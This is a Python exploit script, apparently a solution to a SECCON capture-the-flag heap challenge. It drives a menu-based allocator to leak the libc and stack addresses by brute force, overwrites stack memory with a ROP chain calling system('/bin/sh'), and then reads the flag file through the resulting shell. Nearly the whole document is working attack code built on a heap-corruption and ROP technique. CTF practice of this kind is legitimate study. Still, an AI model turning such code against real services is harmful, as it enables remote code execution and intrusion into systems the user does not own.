#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':8215}, \
                        monitor = {'host':os.getenv('SECCON_HOST'), 'port':os.getenv('SECCON_PORT')})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6', \
                        monitor = 'libc.so.6')
env.select(args.ENV or 'monitor')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena      = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    f3 = Free3(conn)

    def free_chunk(size):
        id_a = f3.alloc(0x20)
        f3.edit(id_a, b'a'*0x18+p32(0xd41))
        f3.release(id_a)

        for _ in range(2):
            f3.alloc_release(0x400)
        f3.alloc_release(0x1000-0x290-0x30-0x410*2-size-0x20 - 0x10)

        f3.alloc_release(0x280)

    for _ in range(8):
        free_chunk(0xf0)

    f3.alloc(0xb0)      # make last remainder

    if env.check('debug'):
        libc_high = 0x7fff
        leak_len = f3.edit(libc_high, b'')
    else:
        with log.progress('Progress ') as p:
            for high in range(0x7000, 0x8000)[::-1]:
                if high % 0x10 == 0:
                    p.status('{:.2f} %'.format((0x8000-high)/0x1000*100))
                leak_len = f3.edit(high, b'')
                if leak_len is not None:
                    libc_high = high
                    break

    addr_libc_mainarena = ((libc_high << 32) | leak_len) - 0x130
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    success('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_environ   = libc.symbols['__environ']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    '''
    for _ in range(13):
        f3.release(libc_high)

    leak_len = f3.edit(0x5555, p64(addr_libc_mainarena + 0x70)[:-1])
    addr_heap_base = ((0x5555 << 32) | leak_len) - 0xedfb0
    success('addr_heap_base    = 0x{:012x}'.format(addr_heap_base))
    '''

    f3.alloc_release(0x20) # clear unsorted bin
    free_chunk(0xf0)
    f3.alloc_release(0xd0)

    for _ in range(14):
        f3.release(libc_high)

    f3.edit(0, p64(addr_libc_environ - 8).ljust(0x30, b'\x00') + p64(addr_libc_mainarena + 0x60))

    f3.alloc_release(0x20)

    if env.check('debug'):
        stack_high = 0x7fff
        leak_len = f3.edit(stack_high, b'')
    else:
        for high in range(0x7fff, libc_high, -1):
            leak_len = f3.edit(high, b'')
            if leak_len is not None:
                stack_high = high
                break

    addr_stack = ((stack_high << 32) | leak_len)
    success('addr_stack        = 0x{:012x}'.format(addr_stack))

    f3.alloc_release(0x20)
    f3.edit(0, p64(addr_stack - 0x140))

    rop = ROP(libc)
    rop.call(rop.ret)
    rop.system(addr_libc_str_sh)
    rop.exit(0)

    f3.alloc_release(0x20)
    f3.edit(stack_high, bytes(rop))

    f3.exit()

class Free3:
    def __init__(self, conn):
        self.c = conn

    def alloc(self, size):
        self.c.sendlineafter(b'> ', b'1')
        self.c.sendlineafter(b'size: ', str(size).encode())
        self.c.recvuntil(b'ID:')
        return int(self.c.recvuntil(b' allocated', drop=True), 16)

    def edit(self, _id, data):
        self.c.sendlineafter(b'> ', b'2')
        self.c.sendlineafter(b'id: ', str(_id).encode())
        if b'data' not in self.c.recv(4):
            return None
        m = self.c.recvregex(br'\(([0-9]+)\): ', capture=True)
        self.c.sendline(data)
        return int(m.group(1).decode())

    def release(self, _id):
        self.c.sendlineafter(b'> ', b'3')
        self.c.sendlineafter(b'id: ', str(_id).encode())

    def alloc_release(self, size):
        self.release(self.alloc(size))

    def exit(self):
        self.c.sendlineafter(b'> ', b'0')
        self.c.recvuntil(b'Bye.\n')

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline(b'exec 2>&1')
    sleep(0.1)
    conn.sendline(b'echo FLAG_HERE; cat flag*')
    conn.recvuntil(b'FLAG_HERE\n')
    print('FLAG : %s' % conn.recvline(keepends=False).decode())

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    main()

#==========
